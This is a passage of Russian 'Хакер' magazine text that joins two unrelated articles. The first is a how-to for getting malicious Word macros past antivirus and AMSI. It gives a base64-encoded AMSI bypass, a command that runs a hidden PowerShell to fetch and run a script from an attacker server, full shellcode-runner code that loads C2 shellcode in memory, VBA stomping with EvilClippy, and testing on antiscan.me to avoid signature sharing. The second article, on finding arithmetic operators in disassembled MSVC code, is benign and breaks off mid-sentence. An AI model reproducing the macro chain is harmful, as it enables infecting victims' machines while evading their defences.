действие, но с увеличением адреса на 1, при этом фун кции передается код
операции return, который равен 0xc3.
  В резуль тате в начале фун кции AmsiScanString будет поставлен неопе-
рационный код 0x90, а после него — код возврата 0xC3, и эта фун кция просто
завершится сразу после того, как будет вызвана, что позволит обойти AMSI
в VBA. Вот как выг лядит выполнение фун кции AmsiScanString после при-
менения пат ча в отладчике WinDbg.





                         Резуль тат пат ча

Все, что остается, — повторить весь процесс для фун кции AmsiScanBuffer,
смещение для которой уже известно. Тут стоит отметить, что есть и более
изощренные способы сделать это, например динамически искать началь ные
байты каждой фун кции, как толь ко адрес Amsi.dll будет заг ружен в память.
Кроме того, есть некоторые отличия в процессе пат ча библиотеки в 32-раз-
рядной и 64-разрядной версиях Word.
  На некоторых сайтах можно встретить описания способов обхода AMSI
на VBA с исполь зованием совершенно иных, аль тернативных методов, не тре-
бующих взаимодействия с API Windows. Правда, некоторые из них требуют
записы вать на диск файлы, и с этим можно влипнуть. Примеры на эту тему
можно найти в следующем Git-репозитории.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




               ОБХОДИМ ДЕТЕКТ ÂÐÅÄÎÍÎÑÍÛÕ
                        ÌÀÊÐÎÑÎÂ WORD





ÎÁÔÓÑÊÀÖÈß ÑÒÐÎÊ

Посколь ку созданный Брен даном Ортизом VBA-скрипт исполь зует WMI-объект
для порождения процесса PowerShell, он неизбежно привлечет повышен ное
внимание любого антивирусного движка. Наиболее очевид ным решением этой
проблемы является шифрование статических строк внут ри мак роса.
   Например,  при  создании  объекта WMI  исполь зуют ся  такие  строки,
как winmgmts:, Win32_ProcessStartup, Win32_Process и им подобные.
При  статическом  сканировании  мак роса  эти  строки  будут  идеаль ными
мишенями для антивиру са, он просто неизбежно пометит их как вредоносные.
Брен дан исполь зовал следующий метод обфускации.





                    Обфускация строк

Он объявил перемен ную, в которой будут сохранять ся статические строки,
присутству ющие в мак росе VBA. Затем он объявил выход ную перемен ную,
в которой будет содержать ся зашифрован ная строка. После этого он преобра-
зовал полезную наг рузку из строковой перемен ной в сим воль ный массив.
Затем десятичное значение каждого сим вола сум миру ется со значением 26.
Далее он забил сим вол дополнитель ными нулями, чтобы позже, в процессе
деобфускации VBA, получились пред сказуемые 3-сим воль ные значения. Если
длина вывода составляет один сим вол, то к нему добавляет ся два нуля, если
длина — два сим вола, добавляет ся один ноль, а если три сим вола, ничего
не добавляет ся.
   Таким образом формиру ется зашифрован ная выход ная строка, которая
отправляет ся в буфер обмена через кон вейер. После запуска скрипта в буфер
обмена помещается строка примерно следующего содержания.





                     Резуль тат запуска скрипта

Деобфусцирующий мак рос в VBA выг лядит примерно так.





                   Деобфусцирующий мак рос

В  скрипте  создают ся под прог раммы  со  слу чайными именами,  которые
не выдадут антивирусному сканеру, что процеду ра может быть вредоносной,
а так же запутают любого аналитика, которому попадет в руки такой мак рос.
В VBA под прог рамма вызывается при помощи инструк ции, которая имеет при-
мерно следующий вид.




                    Вы зов под прог раммы

Сначала зашифрован ная полезная наг рузка поступает в под прог рамму Joy
и запускает цикл Do While. Затем она отправляет ся в под прог рамму Man,
извлекающую первые три числа (вот зачем понадобилось заполнение нулями),
после чего передает эти сим волы фун кции bread. Она вычтет 26 из трех сим-
волов, чтобы получить кон крет ное дешифрован ное число. Это число является
ASCII-эквивален том сим вола и сохраняется в перемен ной green.
  Далее вся зашифрован ная полезная наг рузка отправляет ся фун кции rand,
которая удаляет из нее первые три сим вола и сохраняет их обратно в перемен-
ную paper. Затем процесс повторяется до тех пор, пока вся полезная наг рузка
не редуцирует ся до нуля.
  Наконец, дешифрован ная полезная наг рузка возвращает ся вызывающей
процеду ре при помощи инструк ции Joy = green.


ÂÛÏÎËÍÅÍÈÅ POWERSHELL ÏÐÈ ÏÎÌÎÙÈ WMI

Далее необходимо запустить экзем пляр процесса PowerShell при помощи WMI.
Для этого создает ся объект WMI посредством вызова фун кции VBA GetObject
с зашифрован ной строкой winmgmts:, резуль тат сохраняется в перемен ной
ObjWMIService.
  После этого вызывается фун кция Get из объекта WMI Service с зашиф-
рован ной версией строки Win32_ProcessStartup и сохраняется в перемен ную
objStartup. Это позволяет задать парамет ры запуска для создаваемого
скриптом процесса PowerShell. Следующие действия направлены на то, чтобы
спрятать  окно  PowerShell  (для  этого  значение перемен ной objConfig.
showWindow  устанавливается в  0) — поль зователь даже не узнает,  что
в фоновом режиме выполняет ся какой-то скрипт.
  Созданному процессу передаются заранее сформирован ные парамет ры
и настройки в виде несколь ких сцепленных строк. Весь ход создания объекта
WMIObject выг лядит примерно так.




             Вы полнение PowerShell при помощи WMI


ÏÎËÅÇÍÀß ÍÀÃÐÓÇÊÀ POWERSHELL

Прежде чем запустить вредоносную коман ду PowerShell, необходимо отклю-
чить AMSI. Посколь ку инстанс PowerShell порождает ся в отдель ном процессе,
здесь возникает заг воздка с еще одним слу чаем интеграции AMSI, который
придет ся  обойти прежде,  чем  скрипт  начнет  какую-либо  вредоносную
активность.
   Работа мак роса начинается с отключения AMSI в VBA, чтобы во время
исполнения система не пометила содержимое мак роса как вредоносное.
   Для этого объявляются три разные строки — str1, str2 и str3, а затем им
передается в качестве значения полезная наг рузка, которую нужно прог нать
через объект WMI (процесс создания этого объекта был описан выше).
Это сделано ради удобочитаемости и пригод ности к отладке: разделив полез-
ную наг рузку на фраг менты, можно выявить, где имен но она прек ращает
выполнять ся.
  Первая строка (str1) получает в качестве наг рузки зашифрован ную версию
кода:


Powershell.exe -ep bypass -nop -c

Если не удается создать процесс PowerShell при выполнении мак роса, то уже
известно, что проблема зак лючается в первом зашифрован ном фраг менте.
   Вторая строка  (str2) получает в качестве наг рузки следующий зашиф-
рован ный код:


"[System.text.encoding]::unicode.GetString([System.Convert]::
Frombase64String('JABhACAAPQAgAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwA
eQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAOwBmAG8AcgBlAGEAYwBoACgAJABiACAAaQ
BuACAAJABhACkAewBpAGYAIAAoACQAYgAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAn
AEEAJwAgACsAJwBtACcAKwAgACcAKgBpAFUAdABpAGwAcwAnACkAewAkAGMAPQAkAG
IAfQB9ADsAJABkACAAPQAgACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8A
bgBwAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAGUAYQBjAGgAIA
AoACQAZQAgAGkAbgAgACQAZAApACAAewBpAGYAIAAoACQAZQAuAE4AYQBtAGUAIAAt
AGwAaQBrAGUAIAAnAGEAJwAgACsAIAAnACoARgBhAGkAbABlAGQAJwApAHsAJABmAD
0AJABlAH0AfQA7ACQAZgAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAA
JAB0AHIAdQBlACkA')) |iex;

Эта строка — зашифрован ный обход AMSI. Шифрование выполнено по осно-
ванию 64, так как при переводе с VBA на PowerShell могут возникнуть проб-
лемы при передаче специаль ных сим волов. В декодирован ном виде обход
укладывается в одну строку, а в несверну том выг лядит примерно так.





        Код обхода AMSI — иллюстрация с сайта depthsecurity.com

Если будет получено уведом ление Microsoft Defender о блокировке скрипта
на дан ном этапе, станет очевид но, что обход не удался. Если не удастся уста-
новить соединение с веб-сервером для скачивания полезной наг рузки, но сам
скрипт PowerShell запустится успешно, это так же будет означать, что проблема
возникла имен но здесь.
   Третья строка (str3) получает в качестве наг рузки такой код:


iex ((new-object net.webclient).downloadString('http:///
sliver-sc-runner.ps1'))"

Так  извлекает ся первая  часть  полезной  наг рузки,  заг рузчик  шелл-кода,
который будет заг ружать байт-код со стадии 2 и выполнять его непосредс-
твен но в памяти.


ÇÀÃÐÓÇ×ÈÊ ØÅËË-ÊÎÄÀ

После запуска из PowerShell скрипт скачивает сгенерирован ный шелл-код,
а затем, восполь зовавшись рефлексией, заг ружает фун кции Windows API, экви-
вален тные VirtualAlloc, CreateThread и WaitForSingleObject.
   Сгенерирован ный шелл-код исполь зует заг ружен ные API Windows, чтобы
выполнить код в текущем процессе PowerShell. Это и называется рефлексией,
в ходе нее фун кции создают ся и  заг ружаются в память. Есть причина,
по которой нужно действовать имен но так, а не исполь зовать, например, фун-
кцию add-type из арсенала PowerShell.
  Дело в том, что Add-Type создает времен ный файл и сохраняет его на диск.
Такой файл — это артефакт, по которому вирусный аналитик может догадать-
ся, что в системе происходит что-то нехорошее. Кроме того, такой файл может
быть замечен и просканирован антивирусными движками, ког да он уже сох-
ранен на диск.
  В итоге созданный Брен даном Ортизом скрипт принял следующий вид:


function LookUpFunction{
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-
Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].
Equals('System.dll')}).GetType('Microsoft.Win32.
UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq '
GetProcAddress') {$tmp += $_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('
GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function getDelegateType{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]]
$func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDOmain]::CurrentDomain.DefineDynamicAssembly((
New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[
System.Reflection.Emit.AssemblyBuilderAccess]::Run).
DefineDynamicModule('InMemoryModule',$false).DefineType('
MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass',[
System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [
System.Reflection.CallingConventions]::Standard, $func).
SetImplementationFlags('Runtime,Managed')
    $type.DefineMethod('Invoke','Public, HideBySig, NewSlot,
Virtual',$delType, $func).SetImplementationFlags('Runtime,Managed'
)
    return $type.CreateType()
}
[Byte[]] $buf = (new-object net.webclient).DownloadData('http://<
attacker controlled="" web="" server="">/<c2 generated=""
shellcode="">.bin')
$lpmem = [System.Runtime.InteropServices.Marshal]::
GetDelegateForFunctionPointer((LookUpFunction Kernel32.dll
VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [
UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000,
0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpmem,
$buf.Length)
$hThead = [System.Runtime.InteropServices.Marshal]::
GetDelegateForFunctionPointer((LookUpFunction Kernel32.dll
CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [
IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,
$lpmem,[IntPtr]::Zero,0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::
GetDelegateForFunctionPointer((LookUpFunction Kernel32.dll
WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int
]))).Invoke($hThead, 0xFFFFFFFF)</c2></attacker>

При исполнении шелл-код выполняет обратный вызов к серверу C2, а затем
возвращает управление шелл-коду.




                 Скрипт отработал и вернул управление


ÑÒÎÌÏÈÍÃ VBA

Остает ся последний этап — стом пинг VBA. Это акт удаления частично сжатой
версии исходного кода VBA, сохранен ного в докумен те, — так, что остается
толь ко пред варитель но ском пилирован ный код. Ког да документ откры вают
на целевой машине в той же версии Word, для которой создавался скрипт, код
VBA не ком пилиру ется заново — вместо этого выполняет ся сохранен ный мак-
рос VBA.
   Таким образом, если нам заблаговремен но известно, с какой версией VBA
будет выполнять ся наш мак рос, мы можем удалить из докумен та исходный код
и оставить толь ко ском пилирован ный. Благодаря этому радикаль но сужается
возможность анализа кода и снижает ся вероятность его обнаружения анти-
виру сом.
   Для такой работы особен но хорош инстру мент EvilClippy , который даже поз-
воляет заменить нескомпилирован ный мак рос VBA безвред ной версией VBA-
кода. Таким образом, ты можешь заменить вредоносный мак рос на код,
который пишет «Hello World!». Ког да документ будет открыт, выполнится и вре-
доносный мак рос, если версия Oﬃce — имен но та, для которой он ком пилиро-
вался. Все вышеперечисленное  EvilClippy может выполнить при помощи
единствен ной строки кода, выг лядящей примерно так:


.\EvilClippy.exe -s 'C:\OSEP\module6\6_8_1_PowerShell_ShellCode_
Runner\fake.vba' -d -r -g C:\OSEP\module6\6_8_1_PowerShell_
ShellCode_Runner\6_8_2_WMI_2_PS_final_template.doc

В резуль тате выполнения коман ды в папке с исходным файлом создает ся
новый документ, к имени которого добавлена строка _EvilClippy.


                          Так работает EvilClippy

Обрати внимание, насколь ко два этих файла отличают ся по размеру. Теперь
остается толь ко заг рузить вредоносный документ на antiscan.me и посмотреть,
сколь ко антивирусных движков распознают его как вредоносный. В дан ном
слу чае обязатель но поль зовать ся antiscan.me, а не VirusTotal, посколь ку первый
из этих двух сайтов не передает вредоносную наг рузку антивирусным ком-
паниям для ее добавления в базы сиг натур.


ÂÛÂÎÄÛ

А вот и резуль тат!





Усилия вознаграждены. Угрозу обнаружили всего 5 из 26 антивирусных движ-
ков, и автору скрипта удалось усколь знуть от самых распространен ных, таких
как Windows Defender, Sophos, Kaspersky и McAfee. С помощью применен ных
им методов скрипту удалось отключить AMSI и выполнить вредоносный VBA-
скрипт на машине, защищен ной Windows Defender.
ВЗЛОМ





                                                                    Крис Касперски
                                                                         Известный российский
                                                                                         хакер. Легенда ][, ex-
                                                                          редактор ВЗЛОМа. Также
                                                                                 известен под
                                                                        псевдонимами мыщъх,
                                                                               nezumi (яп. 鼠, мышь), n2k,
                                                                                             elraton, souriz, tikus, muss,
                                                                                                farah, jardon, KPNC.

НАХОДИМ
МАТЕМАТИЧЕСКИЕ
ОПЕРАТОРЫ В
                                                            Юрий ЯзевДИЗАССЕМБЛИРОВАН                                                                    Широко известен под
                                                                       псевдонимом yurembo.
                                                                          Программист, разработчикНЫХ ПРОГРАММАХ
                                                                              видеоигр, независимый
                                                                             исследователь. Старый
                                                                           автор журнала «Хакер».
                                                                               yazevsoft@gmail.com





На пер вый взгляд кажет ся, что в распозна вании ариф-
метических операций нет ничего сложного. Одна ко даже
неоп тимизи рующие ком пилято ры используют ряд хит рых
при емов, которые прев раща ют нахождение матема тичес-
ких операто ров в голов ную боль. Давай изу чим теорию
и пот рениру емся на прак тике обна ружи вать матема тичес-
кие операции в бинар ном коде прог рамм, под готов ленных
раз ными ком пилято рами.




Пят надцать лет назад эпический труд Криса Касперски «Фун дамен таль ные
основы хакерства» был настоль ной книгой каждого начинающего исследова-
теля в области компь ютерной безопасности. Однако время идет, и знания,
опубликован ные Крисом, теряют акту аль ность. Редак торы «Хакера» попыта-
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
  Ссылки на дру гие статьи из этого цик ла ищи на странице автора.



ÈÄÅÍÒÈÔÈÊÀÖÈß ÎÏÅÐÀÒÎÐÀ +
В общем слу чае оператор + тран слирует ся либо в машин ную инструк цию ADD,
«перемалывающую» целочисленные операн ды, либо, с учетом наличия в про-
цессоре под держки SSE (а без нее процессоры уже давным-давно не выпус-
кают ся), в инструк цию ADDSS, обрабаты вающую веществен ные значения оди-
нарной точности, и ADDSD — двойной точности.
  Оптимизирующие ком пиляторы могут заменять ADD xxx, 1 более ком пак-
тной коман дой INC xxx, а конструк цию c = a + b + const тран слировать
в машин ную инструк цию LEA c, [a + b + const]. Такой трюк позволяет
одним махом складывать несколь ко перемен ных, возвратив получен ную сум му
в любом регистре общего назначения, — необязатель но в левом слагаемом,
как это требует мнемоника коман ды ADD. Однако LEA не может быть непос-
редствен но деком пилирована в оператор +, посколь ку она исполь зует ся
не толь ко для оптимизирован ного сложения (что, в общем-то, толь ко побоч-
ный продукт ее деятель ности), но и по своему прямому назначению —
для вычисления эффективного смещения.
   Рассмот рим пример demo_plus, демонстрирующий исполь зование опе-
ратора + со значениями одинарной точности:


#include <iostream>


int main()
{
    float a = 0.7f, b = 1.4f, c;
    c = a + b;
    std::cout << c << std::endl;
    c = c + 0.3f;
    std::cout << c << std::endl;
}




                  Резуль тат выполнения demo_plus

Прежние версии ком пиляторов по умолчанию позволяли исполь зовать неини-
циализирован ные перемен ные. Теперь же это не так, и ком пилятор обры вает
тран сляцию  прог раммы,  встретив  неинициализирован ную  перемен ную.
Это лишает его возможности заг ружать значение отку да угод но, тем самым
защищая прог раммиста от фаталь ных ошибок, которые могут произойти, если
он забудет присвоить значение объявленной перемен ной.
   Резуль тат тран сляции этого примера ком пилятором Microsoft Visual C++
2022 с отключен ной оптимизацией должен выг лядеть приблизитель но так:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
var_c           = dword ptr -18h
var_a           = dword ptr -14h
var_b           = dword ptr -10h
; Резервируем память для локальных переменных
                sub     rsp, 38h
; Загружаем в регистр XMM0 значение из сегмента данных только для
чтения
                movss   xmm0, cs:__real@3f333333
; Перекладываем это значение из регистра в переменную var_a
                movss   [rsp+38h+var_a], xmm0
; Загружаем в регистр следующее по порядку значение
                movss   xmm0, cs:__real@3fb33333
; Перекладываем его в переменную var_b
                movss   [rsp+38h+var_b], xmm0
; Первое значение возвращаем в регистр XMM0 из переменной var_a
                movss   xmm0, [rsp+38h+var_a]
; Складываем содержимое XMM0 со значением переменной var_b
                addss   xmm0, [rsp+38h+var_b]
; Копируем сумму var_a и var_b в переменную var_c, следовательно,
var_c = var_a + var_b
                movss   [rsp+38h+var_c], xmm0
; Готовим параметры для передачи оператору <<
; Второй слева — переменная var_c
                movss   xmm1, [rsp+38h+var_c]
; Первый слева — формат вывода
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Собственно вызов оператора вывода строки
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
; Плюс вывод символа новой строки
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Загружаем в XMM0 значение переменной var_c...
                movss   xmm0, [rsp+38h+var_c]
; ...прибавляем к этому значению значение из сегмента данных
только для чтения
                addss   xmm0, cs:__real@3e99999a
; Обновляем var_c: var_c = var_c + const
                movss   [rsp+38h+var_c], xmm0
; Готовим параметры для передачи оператору <<
; Второй слева — переменная var_c
                movss   xmm1, [rsp+38h+var_c]
; Первый слева — формат вывода
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Собственно вызов оператора вывода строки
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
; Плюс вывод символа новой строки
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                xor     eax, eax
                add     rsp, 38h
                retn
main            endp

А теперь посмотрим, как будет выг лядеть тот же самый пример, ском пилиро-
ван ный с ключом /Ox (мак сималь ная оптимизация):


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
                sub     rsp, 28h
; Как ловко! Компилятор подсчитал сумму во время компиляции
; и подставил ее непосредственно для вывода
; С чего бы ему идти на такие хитрости без последствий?
; Значения-то представляют собой константы,
; которые хранятся в сегменте данных только для чтения
                movss   xmm1, cs:__real@40066666
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Второе для вывода значение — с ним такая же история, как с
первым значением
                movss   xmm1, cs:__real@40199999
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                xor     eax, eax
                add     rsp, 28h
                retn
main            endp

В оптимизирован ном варианте нет ни намека на сложение или дру гие ариф-
метические операции! С возведен ным флагом /O2 (мак сималь ная оптимиза-
ция по скорости) ком пилятор создает точно такой же код.
   Embarcadero C++Builder генерирует похожий код, а в слу чае оптимиза-
ции — еще хуже. Поэтому приводить резуль таты его тру да бессмысленно —
никаких новых «изюминок» они в себе не несут.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





          НАХОДИМ МАТЕМАТИЧЕСКИЕ ОПЕРАТОРЫ В
            ДИЗАССЕМБЛИРОВАННЫХ ПРОГРАММАХ





ÈÄÅÍÒÈÔÈÊÀÖÈß ÎÏÅÐÀÒÎÐÀ –
В общем слу чае оператор – тран слирует ся либо в машин ную инструк цию SUB
(если операн ды — целочисленные значения), либо в инструк цию SUBSS (если
операн ды — веществен ные значения одинарной точности) или в SUBSD (ког да
операн ды двойной точности). Оптимизирующие ком пиляторы могут заменять
SUB xxx, 1 более ком пак тной коман дой DEC xxx, а конструк цию SUB a,
const тран слировать в ADD a, –const, которая ничуть не ком пак тнее и нис-
коль ко не быстрей (и та и дру гая укладывается в один такт). Однако хозяин
(ком пилятор) — барин.
  Покажем это на примере demo_minus, демонстрирующем исполь зование
оператора – со значениями двойной точности:


#include <iostream>


int main()
{
    double a = 3.1, b = 1.6, c;


    c = a - b;
    std::cout << c << std::endl;
    c = c - 10;
    std::cout << c << std::endl;
}




                  Резуль тат выполнения demo_minus

Неоптимизирован ный вариант будет выг лядеть приблизитель но так:


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
var_c           = qword ptr -28h
var_a           = qword ptr -20h
var_b           = qword ptr -18h
; Резервируем память для локальных переменных
                sub     rsp, 48h
; Загружаем в регистр XMM0 значение из сегмента данных только для
чтения
                movsd   xmm0, cs:__real@4008cccccccccccd
; Перекладываем это значение из регистра в переменную var_a
                movsd   [rsp+48h+var_a], xmm0
; Загружаем в регистр, заменяя имеющееся там значение следующим
по порядку значением
                movsd   xmm0, cs:__real@3ff999999999999a
; Перекладываем его в переменную var_b
                movsd   [rsp+48h+var_b], xmm0
; Из переменной var_a возвращаем значение в регистр XMM0
                movsd   xmm0, [rsp+48h+var_a]
; Вычитаем из var_a значение переменной var_b, записывая
результат в XMM0
                subsd   xmm0, [rsp+48h+var_b]
; Записываем в var_c разность var_a и var_b:
; var_c = var_a — var_b
                movsd   [rsp+48h+var_c], xmm0
                movsd   xmm1, [rsp+48h+var_c]
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
; Загружаем в регистр XMM0 значение переменной var_c — готовим к
вычислению
                movsd   xmm0, [rsp+48h+var_c]
; Вычитаем из var_c значение, взятое из сегмента данных только
для чтения
; При этом результат записываем в регистр XMM0
                subsd   xmm0, cs:__real@4024000000000000
; Обновляем содержимое переменной var_c:
; var_c = var_c — const
                movsd   [rsp+48h+var_c], xmm0
                movsd   xmm1, [rsp+48h+var_c]
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
                xor     eax, eax
                add     rsp, 48h
                retn
main            endp

А теперь рассмот рим оптимизирован ный вариант того же примера:


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
                sub     rsp, 28h
; Компилятор подсчитал разность во время трансляции и подготовил
ее значение для вывода
                movsd   xmm1, cs:__real@3ff8000000000000
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
; Результат второй разности также подсчитан во время компиляции
                movsd   xmm1, cs:__real@c021000000000000
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
                xor     eax, eax
                add     rsp, 28h
                retn
main            endp

Embarcadero C++Builder генерирует прак тически иден тичный код без опти-
мизации и нам ного хуже с включен ной оптимизацией, поэтому здесь он
не рассмат ривается.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





          НАХОДИМ МАТЕМАТИЧЕСКИЕ ОПЕРАТОРЫ В
            ДИЗАССЕМБЛИРОВАННЫХ ПРОГРАММАХ





ÈÄÅÍÒÈÔÈÊÀÖÈß ÎÏÅÐÀÒÎÐÀ /
В общем слу чае оператор / тран слирует ся либо в машин ную инструк цию DIV
(беззнаковое целочисленное деление), либо в IDIV (целочисленное деление
со знаком), либо в DIVSS (деление веществен ных значений одинарной точ-
ности) или DIVSD (деление веществен ных значений двойной точности).
   Если делитель кратен степени двойки, то DIV заменяется более быстро-
действу ющей инструк цией битового сдвига вправо SHR  a,  N, где a —
делимое, N — показатель степени с основанием два.
  Несколь ко сложнее происходит быстрое деление знаковых чисел. Недос-
таточно выполнить арифметический сдвиг вправо (коман да арифметического
сдвига вправо SAR заполняет старшие биты с учетом знака числа), ведь если
модуль делимого мень ше модуля делителя, то арифметический сдвиг вправо
сбросит все значащие биты в «битовую корзину», в резуль тате чего получит ся
0xFFFFFFFF, то есть -1, в то время как правиль ный ответ — ноль.
  Вообще же деление знаковых чисел арифметическим сдвигом вправо дает
округление в боль шую сторону,  что совсем не входит  в наши планы.
Для округления знаковых чисел в мень шую сторону необходимо перед выпол-
нением сдвига добавить к делимому число 2N – 1, где N — количество битов,
на которые сдвигает ся число при делении. Лег ко видеть, что это приводит
к увеличению всех сдвигаемых битов на единицу и переносу в старший разряд,
если хотя бы один из них не равен нулю.
  Следует отметить: деление — очень мед ленная операция, гораздо более
мед ленная, чем умножение (выполнение DIV может занять свы ше 40 так тов,
в то время как MUL обычно укладывается в 4), поэтому прод винутые оптимизи-
рующие ком пиляторы заменяют деление умножением. Существу ет множество
формул подобных преобразований. Вот, например, одна из них — самая
популярная.





Здесь N — разрядность числа. Выходит, грань между умножением и делением
очень тон кая, а их иден тификация доволь но сложная. Рассмот рим пример
demo_divide, в нем, кроме всего прочего, мы увидим выполнение деления
с операн дами различных типов:


#include <iostream>


int main()
{
    unsigned int a = 512;
    std::cout << a / 256 << " " << a / 64 << std::endl;
    int b = 256;
    std::cout << b / 32 << " " << b / 10 << std::endl;
    double d = 0x1024;
    std::cout << d / 512 << " " << d / 0x128 << std::endl;
    float f = 102.f;
    std::cout << f / 51.f << " " << f / 25.5f << std::endl;
}





                  Резуль тат выполнения demo_divide

Резуль тат его ком пиляции ком пилятором Microsoft Visual C++ 2022 с отклю-
чен ной оптимизацией должен выг лядеть так:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
var_a           = dword ptr -38h
var_b           = dword ptr -34h
var_f           = dword ptr -30h
var_2C           = dword ptr -2Ch
var_28           = dword ptr -28h
var_24           = dword ptr -24h
var_d           = qword ptr -20h
var_18           = qword ptr -18h
; Резервируем память для локальных переменных
                sub     rsp, 58h
; Присваиваем переменной var_a значение 0x200 (512 в десятичной
системе)
                mov     [rsp+58h+var_a], 200h
; Обнуляем EDX
                xor     edx, edx
; В регистр EAX копируем значение переменной var_a
                mov     eax, [rsp+58h+var_a]
; Копируем в регистр ECX значение 0x40 (64 в десятичной системе)
; Отсюда становится ясно, что это подготовка делителя
                mov     ecx, 40h ; '@'
; Выполняем деление: EAX = EAX / ECX. Обрати внимание, что для
деления используется инструкция DIV. Можно сделать вывод, что мы
